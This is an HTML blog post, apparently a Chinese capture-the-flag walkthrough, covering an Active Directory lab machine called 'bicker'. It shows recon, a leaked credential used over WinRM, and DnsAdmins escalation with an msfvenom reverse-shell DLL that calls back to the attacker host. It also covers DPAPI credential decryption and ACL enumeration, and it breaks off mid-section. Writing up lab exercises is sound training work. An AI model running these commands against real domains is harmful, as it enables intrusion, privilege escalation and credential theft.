@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://gc.zgo.at/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# **一、信息收集**
+
+## 1. 主机发现
+
+渗透测试的起点是在目标网络中识别存活主机。">
+<meta property="og:title" content="内部_bicker">
+<meta property="og:description" content="# **一、信息收集**
+
+## 1. 主机发现
+
+渗透测试的起点是在目标网络中识别存活主机。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_bicker.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_bicker</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_bicker</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/219" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
+<h2>1. 主机发现</h2>
+<p>渗透测试的起点是在目标网络中识别存活主机。我们通过 <code class="notranslate">arp-scan</code> 对本地网段进行扫描，以定位我们的目标。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l      
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.149 00:0c:29:07:21:7a       VMware, Inc.
+192.168.205.254 00:50:56:ff:e4:86       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.994 seconds (128.39 hosts/sec). 4 responded</pre></div>
+<p>扫描结果明确指向 <code class="notranslate">192.168.205.149</code> 为本次测试的目标主机。</p>
+<h2>2. 端口与服务扫描</h2>
+<p>确定目标 IP 后，使用 Nmap 进行深度探测，以绘制出目标的攻击面。首先进行全端口 TCP 连接扫描，确保不遗漏任何开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 -sT -T4 192.168.205.149 -oA nmapscan/ports 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:37 EDT
+Nmap scan report <span class="pl-k">for</span> bicker.com (192.168.205.149)
+Host is up (0.00048s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49669/tcp open  unknown
+63661/tcp open  unknown
+63662/tcp open  unknown
+63682/tcp open  unknown
+MAC Address: 00:0C:29:07:21:7A (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 90.01 seconds</pre></div>
+<p>在识别出开放端口后，我们针对这些端口进行更详细的服务版本探测和默认脚本扫描，以获取操作系统、域名、主机名等关键信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,63661,63662,63682 -sC -sV -T4 192.168.205.149 -oA nmapscan/xiports
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:40 EDT
+Nmap scan report <span class="pl-k">for</span> bicker.com (192.168.205.149)
+Host is up (0.00023s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-16 13:40:55Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bicker.com0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds<span class="pl-k">?</span>
+...
+<span class="pl-k">|</span> rdp-ntlm-info: 
+<span class="pl-k">|</span>   Target_Name: BICKER
+<span class="pl-k">|</span>   NetBIOS_Domain_Name: BICKER
+<span class="pl-k">|</span>   NetBIOS_Computer_Name: DC
+<span class="pl-k">|</span>   DNS_Domain_Name: bicker.com
+<span class="pl-k">|</span>   DNS_Computer_Name: dc.bicker.com
+...
+<span class="pl-k">|</span> smb2-security-mode: 
+<span class="pl-k">|</span>   3:1:1: 
+<span class="pl-k">|</span>_    Message signing enabled and required
+...</pre></div>
+<p><strong>扫描结果分析与解读：</strong><br>
+综合扫描结果，目标主机的画像变得极为清晰：这是一台主机名为 <code class="notranslate">DC</code> 的 Windows 域控制器，其 DNS 域名为 <code class="notranslate">bicker.com</code>。大量开放的 AD 相关端口（Kerberos, LDAP, SMB）证实了这一点。一个重要的发现是 SMB 签名被强制启用（<code class="notranslate">Message signing enabled and required</code>），这增加了网络层的安全性，可以有效防御 NTLM Relay 等中间人攻击。</p>
+<markdown-accessiblity-table><table role="table">
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>作用/风险提示</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>53/tcp</strong></td>
+<td>DNS</td>
+<td>域名系统，可用于枚举 SRV 记录，绘制域内服务拓扑。</td>
+</tr>
+<tr>
+<td><strong>88/tcp</strong></td>
+<td>Kerberos</td>
+<td>域认证核心，是进行用户名枚举（Kerbrute）和 AS-REP Roasting 攻击的切入点。</td>
+</tr>
+<tr>
+<td><strong>139/445</strong></td>
+<td>SMB</td>
+<td>文件共享服务，可用于枚举共享、检查 Null Session 漏洞。</td>
+</tr>
+<tr>
+<td><strong>389/636</strong></td>
+<td>LDAP/LDAPS</td>
+<td>轻量级目录访问协议，是查询 AD 数据库以获取用户、组、OU 等信息的标准接口。</td>
+</tr>
+<tr>
+<td><strong>3268/3269</strong></td>
+<td>全局编录 (GC)</td>
+<td>AD林的索引服务，允许在不知道对象所在域的情况下进行快速搜索。</td>
+</tr>
+<tr>
+<td><strong>5985/tcp</strong></td>
+<td>WinRM (HTTP)</td>
+<td>Windows 远程管理服务，获得凭据后，这是执行 PowerShell 命令、实现交互式控制的首选通道。</td>
+</tr>
+<tr>
+<td><strong>3389/tcp</strong></td>
+<td>RDP</td>
+<td>远程桌面协议，是图形化登录的入口，可用于凭据爆破或哈希传递。</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<h2>3. Active Directory 服务枚举</h2>
+<p>在确认目标为域控后，我们针对其核心服务进行更具针对性的信息收集。</p>
+<ul>
+<li>
+<p><strong>DNS SRV 记录查询</strong><br>
+通过 <code class="notranslate">dig</code> 查询 SRV 记录，可以精确地确认提供关键服务的服务器主机名。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dig @192.168.205.149 -t SRV _kerberos._tcp.bicker.com
+...
+<span class="pl-k">;;</span> ANSWER SECTION:
+_kerberos._tcp.bicker.com. 600  IN      SRV     0 100 88 dc.bicker.com.
+...</pre></div>
+<p>查询结果进一步证实了 Kerberos (KDC), LDAP, 和全局编录 (GC) 服务均由 <code class="notranslate">dc.bicker.com</code> (<code class="notranslate">192.168.205.149</code>) 提供。</p>
+</li>
+<li>
+<p><strong>LDAP 匿名绑定探测</strong><br>
+尝试在未提供任何凭据的情况下查询 LDAP，探测是否存在允许匿名枚举的常见配置错误。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ldapsearch -x -H ldap://192.168.205.149 -b <span class="pl-s"><span class="pl-pds">"</span>DC=bicker,DC=com<span class="pl-pds">"</span></span>
+<span class="pl-c"><span class="pl-c">#</span> extended LDIF</span>
+...
+<span class="pl-c"><span class="pl-c">#</span> search result</span>
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera
+ tion a successful <span class="pl-c1">bind</span> must be completed on the connection., data 0, v4f7c
+
+<span class="pl-c"><span class="pl-c">#</span> numResponses: 1</span></pre></div>
+<p>服务器拒绝了匿名查询，表明其 LDAP 服务进行了基本的安全加固。</p>
+</li>
+<li>
+<p><strong>Kerberos 用户名枚举</strong><br>
+利用 Kerberos 协议在处理用户存在与否时返回不同错误代码的特性，可以使用 <code class="notranslate">kerbrute</code> 等工具高效地验证用户名列表。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ kerbrute userenum --dc 192.168.205.149 -d bicker.com /usr/share/seclists/Usernames/cirt-default-usernames.txt 
+...
+2025/08/16 09:46:41 <span class="pl-k">&gt;</span>  [+] VALID USERNAME:       ADMINISTRATOR@bicker.com
+2025/08/16 09:46:41 <span class="pl-k">&gt;</span>  [+] VALID USERNAME:       Administrator@bicker.com
+2025/08/16 09:46:41 <span class="pl-k">&gt;</span>  [+] VALID USERNAME:       Guest@bicker.com
+...</pre></div>
+<p>该步骤成功验证了 <code class="notranslate">administrator</code>, <code class="notranslate">guest</code> 等多个内置账户的存在，为后续的凭据攻击提供了目标。</p>
+</li>
+<li>
+<p><strong>AS-REP Roasting 攻击尝试</strong><br>
+这是一种针对禁用了 Kerberos 预身份验证的用户的攻击。如果存在此类用户，攻击者可以为其请求 TGT，并离线爆破其中包含的加密数据以获取用户密码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py bicker.com/ -usersfile user -format hashcat -outputfile <span class="pl-c1">hash</span>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User administrator doesn<span class="pl-s"><span class="pl-pds">'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="pl-s">[-] User guest doesn<span class="pl-pds">'</span></span>t have UF_DONT_REQUIRE_PREAUTH <span class="pl-c1">set</span></pre></div>
+<p>尝试失败，表明目标域中的用户均开启了预身份验证，此攻击路径无效。</p>
+</li>
+</ul>
+<h1><strong>二、初步突破</strong></h1>
+<h2>1. SMB 匿名共享探测</h2>
+<p>尽管 LDAP 匿名绑定被禁用，但 SMB 服务可能存在独立的访问控制配置。我们检查是否存在无需凭据即可访问的共享。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ smbclient -L //192.168.205.149 -N   
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      远程管理
+        C$              Disk      默认共享
+        IPC$            IPC       远程 IPC
+        NETLOGON        Disk      Logon server share 
+        puppy           Disk      
+        SYSVOL          Disk      Logon server share 
+...</pre></div>
+<p>发现了一个名为 <code class="notranslate">puppy</code> 的匿名可读共享，这是一个潜在的信息泄露点。我们连接该共享并下载其中的文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ smbclient //192.168.205.149/puppy -N
+Try <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span> to get a list of possible commands.
+smb: <span class="pl-cce">\&gt;</span> ls
+  <span class="pl-c1">.</span>                                   D        0  Fri Aug 15 00:06:51 2025
+  ..                                DHS        0  Fri Aug 15 05:20:46 2025
+  puppy.jpg                           A    57634  Fri Aug 15 00:06:51 2025
+
+                12923135 blocks of size 4096. 9313382 blocks available
+smb: <span class="pl-cce">\&gt;</span> get puppy.jpg
+getting file <span class="pl-cce">\p</span>uppy.jpg of size 57634 as puppy.jpg (3752.2 KiloBytes/sec) (average 3752.2 KiloBytes/sec)
+smb: <span class="pl-cce">\&gt;</span> <span class="pl-c1">exit</span></pre></div>
+<h2>2. 开源情报 (OSINT) 获取凭据</h2>
+<p>对下载的 <code class="notranslate">puppy.jpg</code> 文件进行分析，寻找可能存在的线索。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ strings puppy.jpg<span class="pl-k">|</span>head -n 10        
+JFIF
+Exif
+bilibili
+Google
+uid=3546958956333518
+0220
+ , <span class="pl-c"><span class="pl-c">#</span>&amp;')*)</span>
+<span class="pl-en">-0-(0%</span>()(
+<span class="pl-s"><span class="pl-pds">((</span>((((((((((((((((((((((((((((((((((((((((((((((((</span>
+<span class="pl-s">a<span class="pl-c1">2#q</span></span></pre></div>
+<p>文件字符串中包含一个 Bilibili UID (<code class="notranslate">3546958956333518</code>)。通过在 Bilibili 网站上搜索此 UID，我们找到了一个用户发布的动态，其中直接泄露了一组凭据：<br>
+<strong><code class="notranslate">tindalos:Th3C@ll0fCtHu1hu!</code></strong></p>
+<h2>3. 获得初始 Shell</h2>
+<p>利用这组意外获得的凭据，我们尝试通过之前发现的 WinRM 服务 (端口 5985) 登录目标主机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ evil-winrm -i 192.168.205.149 -u <span class="pl-s"><span class="pl-pds">'</span>tindalos<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>Th3C@ll0fCtHu1hu!<span class="pl-pds">'</span></span>
+                                        
+Evil-WinRM shell v3.7
+...                                     
+Info: Establishing connection to remote endpoint
+<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\t</span>indalos<span class="pl-cce">\D</span>ocuments<span class="pl-k">&gt;</span></pre></div>
+<p>连接成功！我们获得了一个属于域用户 <code class="notranslate">bicker\tindalos</code> 的交互式 PowerShell Shell，完成了初步突破。</p>
+<h1><strong>三、权限提升</strong></h1>
+<h2>1. 内部信息收集与态势感知</h2>
+<p>立足于当前 Shell，首要任务是全面了解 <code class="notranslate">tindalos</code> 用户的权限和在域中的角色。</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> whoami <span class="pl-k">/</span>all
+
+用户信息
+<span class="pl-k">----------------</span>
+用户名          SID
+<span class="pl-k">===============</span> <span class="pl-k">============================================</span>
+bicker\tindalos S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">1103</span>
+
+组信息
+<span class="pl-k">-----------------</span>
+组名                                        类型   SID                                          属性
+<span class="pl-k">===========================================</span> <span class="pl-k">======</span> <span class="pl-k">============================================</span> <span class="pl-k">======================================</span>
+...
+BICKER\DnsAdmins                            别名   S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">1101</span> 必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用于组<span class="pl-k">,</span> 本地组
+...</pre></div>
+<p><strong>关键发现：</strong> <code class="notranslate">whoami /all</code> 的输出显示，用户 <code class="notranslate">tindalos</code> 隶属于 <code class="notranslate">DnsAdmins</code> 组。这是一个极度危险的内置组，其成员通常可以通过滥用 DNS 服务配置来实现权限提升至域控的 <code class="notranslate">SYSTEM</code>。</p>
+<h2>2. 提权路径分析：两条道路</h2>
+<p>基于 <code class="notranslate">DnsAdmins</code> 的权限，我们有两条提权路径可选：</p>
+<ol>
+<li><strong>捷径（高噪音）：</strong> 直接配置恶意 DLL，然后通过重启整个靶机来触发执行。此方法简单粗暴，但动静巨大，在真实环境中应极力避免。</li>
+<li><strong>预期解（低噪音）：</strong> 深入挖掘信息，寻找一个拥有重启 DNS 服务权限的用户，通过一系列横向移动，最终在不重启服务器的情况下触发漏洞。</li>
+</ol>
+<h2>3. 提权路径一：捷径（重启靶机）</h2>
+<p>此路径利用 <code class="notranslate">DnsAdmins</code> 权限设置好后门，然后通过重启靶机这一“歪门邪道”来完美跳关。</p>
+<ul>
+<li>
+<p><strong>生成恶意 DLL</strong><br>
+使用 <code class="notranslate">msfvenom</code> 创建一个反向连接 Shell 的 DLL。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f dll -o dns.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: dns.dll</pre></div>
+</li>
+<li>
+<p><strong>上传并配置 DLL</strong><br>
+在 <code class="notranslate">tindalos</code> 的 Shell 中，从 Kali 下载此 DLL，并使用 <code class="notranslate">dnscmd.exe</code> 将其注册为 <code class="notranslate">ServerLevelPluginDll</code>。</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> <span class="pl-c1">Invoke-WebRequest</span> <span class="pl-k">-</span>Uri <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.128/dns.dll<span class="pl-pds">"</span></span> <span class="pl-k">-</span>OutFile <span class="pl-s"><span class="pl-pds">"</span>C:\Users\tindalos\Documents\dns.dll<span class="pl-pds">"</span></span>
+
+<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> <span class="pl-c1">dnscmd.exe</span> localhost <span class="pl-k">/</span>config <span class="pl-k">/</span>serverlevelplugindll C:\Users\tindalos\Documents\dns.dll
+
+注册属性 serverlevelplugindll 成功重置。
+命令成功完成。</pre></div>
+</li>
+<li>
+<p><strong>监听并（模拟）重启</strong><br>
+在 Kali 上开启监听。此时，通过虚拟化管理平台重启目标服务器，即可触发 DLL 加载。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888                                                 
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 62282
+Microsoft Windows [�汾 10.0.20348.169]
+(c) Microsoft Corporation����������Ȩ����
+
+C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem<span class="pl-k">32&gt;</span>whoami
+nt authority<span class="pl-cce">\s</span>ystem</pre></div>
+<p>此路径虽然可行，但绕过了靶机设计的核心挑战。</p>
+</li>
+</ul>
+<h2>4. 提权路径二：预期解（精准权限利用）</h2>
+<p>这条路径考验的是在受限环境下的深度信息挖掘和横向移动能力，是更为专业和隐蔽的手法。</p>
+<h3>4.1. 本地凭据挖掘</h3>
+<ul>
+<li><strong>枚举域用户</strong><br>
+为规划横向移动路径，我们枚举域内的其他用户及其组关系。
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> net user jianyin <span class="pl-k">/</span>domain
+...
+全局组成员             <span class="pl-k">*</span>Domain Users         <span class="pl-k">*</span>DNSRestarters
+<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> net user lihua <span class="pl-k">/</span>domain
+...
+全局组成员             <span class="pl-k">*</span>Domain Users         <span class="pl-k">*</span>AccountModifier</pre></div>
+发现了两个关键的自定义组：<code class="notranslate">DNSRestarters</code> 和 <code class="notranslate">AccountModifier</code>。</li>
+<li><strong>绕过 Windows Defender</strong><br>
+尝试执行<code class="notranslate">Seatbelt.exe</code>被 Defender 拦截。通过探索发现 <code class="notranslate">C:\wirteTEMP</code> 是一个白名单目录，后续工具均在此目录下执行。</li>
+<li><strong>利用 DPAPI 解密凭据</strong><br>
+<strong>技术背景</strong>：Windows 使用数据保护 API (DPAPI) 来加密存储在用户配置文件中的敏感信息。由于我们已知 <code class="notranslate">tindalos</code> 的明文密码，可以解密其 DPAPI 主密钥，进而解密由它保护的其他凭据。
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Invoke-WebRequest</span> <span class="pl-k">-</span>Uri <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.128/SharpDPAPI.exe<span class="pl-pds">"</span></span> <span class="pl-k">-</span>OutFile <span class="pl-s"><span class="pl-pds">"</span>C:\wirteTEMP\SharpDPAPI.exe<span class="pl-pds">"</span></span>
+<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> .<span class="pl-k">/</span><span class="pl-c1">SharpDPAPI.exe</span> credentials <span class="pl-k">/</span>unprotect <span class="pl-k">/</span>credfile:<span class="pl-s"><span class="pl-pds">"</span>C:\Users\tindalos\AppData\Roaming\Microsoft\Credentials\A2E4656BCBABFD9279E090E8482A7141<span class="pl-pds">"</span></span> <span class="pl-k">/</span>sid:S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">1103</span> <span class="pl-k">/</span>password:<span class="pl-s"><span class="pl-pds">"</span>Th3C@ll0fCtHu1hu!<span class="pl-pds">"</span></span>
+...
+  CredFile           : A2E4656BCBABFD9279E090E8482A7141
+    ...
+    UserName         : lihua
+    Credential       : hello<span class="pl-k">%</span><span class="pl-c1">2633</span>
+...</pre></div>
+执行成功！我们从 <code class="notranslate">tindalos</code> 的本地存储中，解密出了另一位用户 <code class="notranslate">lihua</code> 的明文密码：<code class="notranslate">hello%2633</code>。</li>
+</ul>
+<h3>4.2. 横向移动与 ACL 深度枚举</h3>
+<p>获得了 <code class="notranslate">lihua</code> 的凭据，我们立即横向移动到该用户的会话中，并深入挖掘其所属的 <code class="notranslate">AccountModifier</code> 组到底拥有何种权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ evil-winrm -i 192.168.205.149 -u <span class="pl-s"><span class="pl-pds">'</span>lihua<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>hello%2633<span class="pl-pds">'</span></span>
+...
+<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\l</span>ihua<span class="pl-cce">\D</span>ocuments<span class="pl-k">&gt;</span> whoami
+bicker<span class="pl-cce">\l</span>ihua</pre></div>
+<p>为了精确枚举 Active Directory 的访问控制列表 (ACL)，我们上传并加载强大的 <code class="notranslate">PowerView.ps1</code> 脚本。</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Invoke-WebRequest</span> <span class="pl-k">-</span>Uri <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.128/PowerView.ps1<span class="pl-pds">"</span></span> <span class="pl-k">-</span>OutFile <span class="pl-s"><span class="pl-pds">"</span>C:\wirteTEMP\pv.ps1<span class="pl-pds">"</span></span>
+
+<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-k">.</span> .\pv.ps1</pre></div>
+<p>加载后，我们使用 PowerView 查询 <code class="notranslate">AccountModifier</code> 组具体对 <code class="notranslate">jianyin</code> 用户拥有哪些权限。</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Find-InterestingDomainAcl</span> <span class="pl-k">-</span>ResolveGUIDs <span class="pl-k">|</span> <span class="pl-c1">Where-Object</span> { <span class="pl-c1">$_<span class="pl-smi">.ObjectDN</span></span> <span class="pl-k">-match</span> <span class="pl-s"><span class="pl-pds">"</span>jianyin<span class="pl-pds">"</span></span> } <span class="pl-k">|</span> <span class="pl-c1">Format-List</span> <span class="pl-k">*</span>
+
+ObjectDN                : CN<span class="pl-k">=</span>jianyin<span class="pl-k">,</span>CN<span class="pl-k">=</span>Users<span class="pl-k">,</span>DC<span class="pl-k">=</span>bicker<span class="pl-k">,</span>DC<span class="pl-k">=</span>com
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : User<span class="pl-k">-</span>Force<span class="pl-k">-</span>Change<span class="pl-k">-</span>Password
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">2107</span>
+IdentityReferenceName   : AccountModifier
+IdentityReferenceDomain : <span class="pl-c1">bicker.com</span>
+IdentityReferenceDN     : CN<span class="pl-k">=</span>AccountModifier<span class="pl-k">,</span>CN<span class="pl-k">=</span>Users<span class="pl-k">,</span>DC<span class="pl-k">=</span>bicker<span class="pl-k">,</span>DC<span class="pl-k">=</span>com
+IdentityReferenceClass  : group</pre></div>
+<p><strong>分析结果</strong>：输出极为精确地告诉我们，<code class="notranslate">AccountModifier</code> 组对 <code class="notranslate">jianyin</code> 用户对象拥有的并非通用写入权，而是一项特定的<strong>扩展权限 (Extended Right)</strong>：<code class="notranslate">User-Force-Change-Password</code>。</p>
+<h3>4.3. 精准利用 ACL 控制用户</h3>
